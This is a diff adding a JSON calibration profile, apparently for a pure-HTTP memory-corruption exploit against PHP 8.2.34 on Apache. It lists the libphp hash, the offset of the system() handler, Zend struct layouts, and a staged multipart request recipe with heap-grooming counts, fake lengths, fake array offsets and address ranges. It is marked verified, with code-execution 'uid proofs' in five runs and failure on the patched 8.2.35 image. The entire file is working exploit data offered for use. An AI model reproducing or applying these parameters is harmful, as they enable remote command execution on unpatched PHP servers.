@@ -1,0 +1,183 @@
+{
+  "schema_version": 1,
+  "id": "php-8.2.34-apache-amd64-pure-http-oom",
+  "verification": {
+    "state": "verified",
+    "runs": 5,
+    "proof": "uid-only-local-differential-lab-5-of-5; php-8.2.35-negative-3-of-3",
+    "verified_at": "2026-10-23T08:22:00Z"
+  },
+  "build": {
+    "image": {
+      "repo_digest": "php@sha256:1650dcb528360aad05d6ed2f83cb403a2a39c31bd14552efd9a747b2207dea86",
+      "image_id": "sha256:f380b054d6364b80f0952a9198e5dc1e1ab4d809aad24d3f3174f059e863f48a",
+      "platform": "linux/amd64"
+    },
+    "php": {
+      "version": "8.2.34",
+      "sapi": "apache2handler",
+      "zts": false,
+      "debug": false
+    },
+    "libphp": {
+      "path": "/usr/lib/apache2/modules/libphp.so",
+      "sha256": "42ae9f69550e036ff5ad3d25d7ebf6b40bf2dd6531e8f891de53bea0d1663e9b",
+      "gnu_build_id": "432b9cdfc44ab0205ee9f81d234d14e474e9aeb6",
+      "elf_class": 64,
+      "endianness": "little",
+      "machine": "EM_X86_64",
+      "type": "ET_DYN"
+    }
+  },
+  "symbols": {
+    "zif_system": {
+      "name": "zif_system",
+      "offset": "0x39b8a0"
+    },
+    "zval_ptr_dtor": {
+      "name": "zval_ptr_dtor",
+      "offset": "0x487650"
+    }
+  },
+  "abi": {
+    "pointer_size": 8,
+    "page_size": "0x1000",
+    "zend_mm_chunk_size": "0x200000",
+    "zend_string": {
+      "size_before_val": "0x18",
+      "len": "0x10",
+      "val": "0x18"
+    },
+    "zval": {
+      "size": "0x10",
+      "value": "0x0",
+      "type_info": "0x8"
+    },
+    "zend_reference": {
+      "size": "0x20",
+      "gc": "0x0",
+      "val": "0x8",
+      "sources": "0x18"
+    },
+    "zend_array": {
+      "size": "0x38",
+      "gc": "0x0",
+      "flags": "0x8",
+      "table_mask": "0xc",
+      "ar_data": "0x10",
+      "num_used": "0x18",
+      "num_elements": "0x1c",
+      "table_size": "0x20",
+      "internal_pointer": "0x24",
+      "next_free": "0x28",
+      "destructor": "0x30"
+    },
+    "zend_execute_data": {
+      "size": "0x50",
+      "opline": "0x0",
+      "call": "0x8",
+      "return_value": "0x10",
+      "func": "0x18",
+      "this": "0x20",
+      "num_args": "0x2c",
+      "prev": "0x30",
+      "symbol_table": "0x38",
+      "call_info": "0x40",
+      "arg1": "0x50"
+    },
+    "types": {
+      "is_string": "0x6",
+      "is_array": "0x7",
+      "is_reference": "0xa",
+      "gc_string": "0x106",
+      "array_ex": "0x307"
+    }
+  },
+  "runtime": {
+    "mpm": "prefork",
+    "workers": 1,
+    "memory_limit": "128M",
+    "post_max_size": "8M",
+    "upload_max_filesize": "2M",
+    "max_input_vars": 1000,
+    "display_errors": false,
+    "file_uploads": true,
+    "session_extension": true,
+    "upload_progress_enabled": true,
+    "session_name": "PHPSESSID",
+    "upload_progress_name": "PHP_SESSION_UPLOAD_PROGRESS"
+  },
+  "request_recipe": {
+    "strategy": "pure-http-oom-v1",
+    "query_fields": 5,
+    "a1": {
+      "boundary_len": 70,
+      "nested_parts": 860,
+      "depth": 64,
+      "key_pad": 90,
+      "ctype_lengths": [103, 231],
+      "small_fillers": {
+        "count": 14,
+        "name_len": 103,
+        "value_len": 8
+      },
+      "tune": {
+        "count": 10,
+        "name_len": 3,
+        "value_len": 87
+      },
+      "large_fields": {
+        "count": 77,
+        "value_len": 8000,
+        "long_name_count": 61,
+        "long_name_len": 87
+      },
+      "burners": {
+        "count": 20,
+        "value_len": 4000
+      },
+      "progress_len": 4000,
+      "tail": {
+        "count": 1,
+        "name_len": 35,
+        "value_len": 35
+      }
+    },
+    "b1": {
+      "boundary_len": 10,
+      "target_offset": "0xe2968",
+      "fake_len": "0xc8000",
+      "allocator_overhead": 25,
+      "value_data_offset": 4120,
+      "name_len": 120,
+      "large_pages": [511, 511, 511, 511, 511, 511, 511, 511, 400, 511, 511, 511, 511, 511, 511, 511],
+      "hit_index": 8,
+      "nested_fillers": 900,
+      "min_dtor_hits": 32,
+      "main_candidates": 8,
+      "libphp_delta_min": "0x1a00000",
+      "libphp_delta_max": "0x1f00000"
+    },
+    "a2": {
+      "boundary_len": 10,
+      "nested_parts": 880,
+      "depth": 64,
+      "fillers": 115
+    },
+    "b2": {
+      "boundary_len": 10,
+      "value_len": 384,
+      "before_fields": 500,
+      "after_fields": 495,
+      "name_len": 10,
+      "refcount": 1,
+      "reference_start": 8,
+      "reference_step": 32,
+      "fake_array_offset": "0xf9398"
+    }
+  },
+  "provenance": {
+    "source": "local-docker-calibration-and-byte-hash-verification",
+    "notes": "Exact official php:8.2.34-apache linux/amd64 image, stock php.ini-production (128M/display_errors=Off), and one prefork worker. The tail A1 pure-HTTP/OOM chain produced uid proofs in 5/5 fresh runs, including an independently executed run. The exact PHP 8.2.35 fixed image stopped at B1 with no heap pointers and no proof in 3/3 runs. Prior art is cited in THIRD_PARTY_NOTICES.md; source files from no-license projects are not redistributed."
+  }
+}
